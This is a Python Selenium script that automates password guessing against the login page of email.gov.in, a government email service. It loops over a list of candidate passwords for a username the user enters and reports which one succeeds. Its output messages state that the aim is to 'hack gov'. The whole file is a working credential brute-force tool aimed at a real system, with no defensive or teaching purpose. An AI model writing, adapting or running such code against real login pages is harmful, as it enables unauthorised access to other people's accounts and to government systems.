from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
import time

def login(usrn, pswrd):
    # Using webdriver_manager to automatically handle ChromeDriver installation
    driver = webdriver.Chrome()
    try:
        driver.get("https://email.gov.in/")
        driver.implicitly_wait(10)
        
        # Enter username
        loginID = driver.find_element(By.XPATH, "//input[@id='username']")
        loginID.send_keys(usrn)
        
        # Enter password
        password = driver.find_element(By.XPATH, "//input[@id='password']")
        password.send_keys(pswrd)
        
        # Click sign in button
        SignInButton = driver.find_element(By.XPATH, "//button[@id='formSubmitButton']")
        SignInButton.click()
        
        # Give some time for the page to load
        time.sleep(2)
        
        # Check for error message
        try:
            err_msg = driver.find_element(By.XPATH, "//td[contains(text(),'The username or password is incorrect. Verify that')]")
            print(f"Login failed with password: {pswrd}")
            return False  # Login failed (password incorrect)
        except NoSuchElementException:
            print(f"Login successful with password: {pswrd}")
            return True  # Login successful
    finally:
        driver.quit()

username = input("Enter Username: ")
passwords = [
        "password1", 
        "password2", 
        "password3",
        # Add more passwords to the list
    ]
    
found_password = False
    
for password in passwords:
    if login(username, password):
        print(f"Successfully logged in with password now we could hack gov :) : {password}")
        found_password = True
        break
    
if not found_password:
    print("None of the passwords worked lol !!")

